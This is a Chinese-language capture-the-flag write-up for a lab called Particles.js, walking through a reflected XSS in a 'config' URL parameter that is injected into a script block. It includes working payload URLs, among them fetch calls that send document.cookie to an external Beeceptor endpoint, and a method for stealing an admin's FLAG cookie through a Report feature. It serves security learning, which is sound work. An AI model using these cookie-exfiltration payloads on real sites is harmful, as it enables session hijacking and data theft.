# lab_Particles.js

1. 一開始來到這個網站，發現這邊有三個選項可以選擇，然後去 change，三個分別都點選後，
發現會在網址後面分別更改為 config=Default、config=Bubble、config=Snow，
    
    ![截圖 2022-12-31 下午10.23.38.png](lab_Particles%20js%204b2def8bd1d842f18eb6d87784298fde/%25E6%2588%25AA%25E5%259C%2596_2022-12-31_%25E4%25B8%258B%25E5%258D%258810.23.38.png)
    
    ![截圖 2022-12-31 下午10.23.05.png](lab_Particles%20js%204b2def8bd1d842f18eb6d87784298fde/%25E6%2588%25AA%25E5%259C%2596_2022-12-31_%25E4%25B8%258B%25E5%258D%258810.23.05.png)
    

1. 接下來隨意去更改 config 的值為 ‘test’，會發現他會將<Script> 裡面的 config.value 的值設為’test’，然後去 fetch(’/test.json’)，這樣表示我在 URL 裡面輸入的字串是可以控制它前端 html 裡面的內容，因此我嘗試將 config 後面的值改為 </script><script>alert(”Hacker_it!”)</script>，從 Response 內容可以看到這邊可以執行我的程式碼，也代表這邊 XSS Attack 是可以成功得，從網也點開可以看到彈跳出視窗 hack it!
    
    ![截圖 2022-12-31 下午10.31.40.png](lab_Particles%20js%204b2def8bd1d842f18eb6d87784298fde/%25E6%2588%25AA%25E5%259C%2596_2022-12-31_%25E4%25B8%258B%25E5%258D%258810.31.40.png)
    
    ![截圖 2022-12-31 下午10.41.50.png](lab_Particles%20js%204b2def8bd1d842f18eb6d87784298fde/%25E6%2588%25AA%25E5%259C%2596_2022-12-31_%25E4%25B8%258B%25E5%258D%258810.41.50.png)
    
    ![截圖 2022-12-31 下午10.41.22.png](lab_Particles%20js%204b2def8bd1d842f18eb6d87784298fde/%25E6%2588%25AA%25E5%259C%2596_2022-12-31_%25E4%25B8%258B%25E5%258D%258810.41.22.png)
    

1. 接下來嘗試使用 Beecepter 接收傳出來的資訊，先在 console 裡面設定 document.cookie ，然後再 fetch('[https://richard.free.beeceptor.com?'+document.cookie](https://richard.free.beeceptor.com/?%27+document.cookie))，就可以看到 beecepter 有接收到資訊，然後我把這段 fetch 放到 XSS 的地方，也一樣可以在 beecepter 收到

![截圖 2022-12-31 下午11.09.57.png](lab_Particles%20js%204b2def8bd1d842f18eb6d87784298fde/%25E6%2588%25AA%25E5%259C%2596_2022-12-31_%25E4%25B8%258B%25E5%258D%258811.09.57.png)

![截圖 2022-12-31 下午11.11.13.png](lab_Particles%20js%204b2def8bd1d842f18eb6d87784298fde/%25E6%2588%25AA%25E5%259C%2596_2022-12-31_%25E4%25B8%258B%25E5%258D%258811.11.13.png)

```
[https://particles.ctf.zoolab.org/?config=1;alert("hack_it");console.log](https://particles.ctf.zoolab.org/?config=1;alert(%22hack_it%22);console.log)({x://\
[https://particles.ctf.zoolab.org/?config=1;fetch("https://richard.free.beeceptor.com?"%2bdocument.cookie);console.log](https://particles.ctf.zoolab.org/?config=1;alert(%22hack_it%22);console.log)({x://\
https://particles.ctf.zoolab.org/?config=</script><script>alert(hacker_it!)</script>
https://particles.ctf.zoolab.org/?config=</script><script>fetch("https://richard.free.beeceptor.com?"%2bdocument.cookie)</script>
```

1. 接下來只要找到 admin 的 cookie 就可以將 admin 的 cookie 回傳，於是開始隨意翻閱瀏覽器，點了一下 Report，之後發現 Cookie 裡面有個 Name 為 FLAG 的 Cookie，然後隨意嘗試了一下發現在一般的頁面，設一個 Cookie Name 為 admin，然後再執行 XSS ，再按 Report 就可以成功獲得 FLAG。這邊的話我不是很明確知道 Report 這個按鈕點下去他背後的行為，只能從黑箱的方式去猜測，他會在 Server 端執行一遍 XSS 的 payload，所以在 Client 端的時候 Fetch 回傳 admin 的值會是空的(第一個頁面），按一下 Report 之後，Fetch 回傳 admin 的值就會是有內容的東西。
    
    ![截圖 2023-01-01 上午1.58.01.png](lab_Particles%20js%204b2def8bd1d842f18eb6d87784298fde/%25E6%2588%25AA%25E5%259C%2596_2023-01-01_%25E4%25B8%258A%25E5%258D%25881.58.01.png)
    
    ![截圖 2023-01-01 上午2.32.48.png](lab_Particles%20js%204b2def8bd1d842f18eb6d87784298fde/%25E6%2588%25AA%25E5%259C%2596_2023-01-01_%25E4%25B8%258A%25E5%258D%25882.32.48.png)
    
    ![截圖 2023-01-01 上午2.16.58.png](lab_Particles%20js%204b2def8bd1d842f18eb6d87784298fde/%25E6%2588%25AA%25E5%259C%2596_2023-01-01_%25E4%25B8%258A%25E5%258D%25882.16.58.png)